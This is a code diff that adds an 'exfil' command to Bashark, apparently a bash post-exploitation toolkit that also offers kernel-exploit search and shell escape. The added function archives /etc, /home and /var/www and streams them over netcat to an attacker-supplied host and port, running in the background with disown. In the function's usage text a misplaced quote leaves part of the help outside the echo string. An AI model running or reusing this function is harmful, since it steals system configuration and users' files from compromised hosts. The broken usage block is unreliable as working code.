@@ -1758,6 +1758,37 @@ ghost(){
 fi
 }
 
+exfil(){
+    exfil_dirs="/etc /home /var/www" #change/add depending on system, these are just basics
+    archive_name="backup.tar.gz"
+    archive_dir="/tmp/" #change this according to needs
+
+    if [[ "$@" =~ .*-h.* ]]; then
+        echo "
+        ${underline}USAGE:${reset}
+            exfil [-h] [HOST PORT]
+        ${underline}OPTIONAL ARGUMENTS:${reset}
+            HOST        Target host/IP
+            PORT        Target port"
+        ${underline}DESCRIPTION:${reset}
+            Archives core data and config files for exfiltration.
+            If a host and port are provided, the data is streamed via netcat.
+            If no arguments are provided, the data is saved to an archive in the current directory.
+    elif [ $# -ge 1 ]; then
+        host=$1
+        port=${2:-80}
+        echo "Archiving and streaming exfil data to $host:$port..."
+        ( tar -czf - $exfil_dirs 2>/dev/null | nc -N $host $port && \
+          printf "\n${green}${bold}Exfil Complete.${reset}\n" || \
+          printf "\n${red}${bold}Exfil failed or finished with errors. Check connection or listener.${reset}\n" ) & disown
+    else
+        echo "No exfil host provided. Saving locally to $archive_dir$archive_name..."
+        ( tar -czf $archive_dir$archive_name $exfil_dirs 2>/dev/null; [ $? -eq 0 ] && \
+          printf "\n${green}${bold}Exfil Complete.${reset}\n" || \
+          printf "\n${red}${bold}Exfil failed or finished with errors.${reset}\n" ) & disown
+    fi
+}
+
 ##Help command
 #Finish and add mod command
 help(){
@@ -1771,6 +1802,7 @@ Bashark ver. 2.0 Commands:
         ${bold}cleanup${reset}${green}      -> ${reset}Modify Bashark cleanup routine settings
         ${bold}cve${reset}${green}          -> ${reset}Search for a kernel exploit
         ${bold}esc${reset}${green}          -> ${reset}Escape to a non-restricted shell
+        ${bold}exfil${reset}${green}        -> ${reset}Quick and dirty exfiltration of core data/config files
         ${bold}fnd${reset}${green}          -> ${reset}Recursively search for string occurrence in current directory
         ${bold}fndre${reset}${green}        -> ${reset}Search for most popular regullar expressions in a file
         ${bold}fileinfo${reset}${green}     -> ${reset}Inspect a file
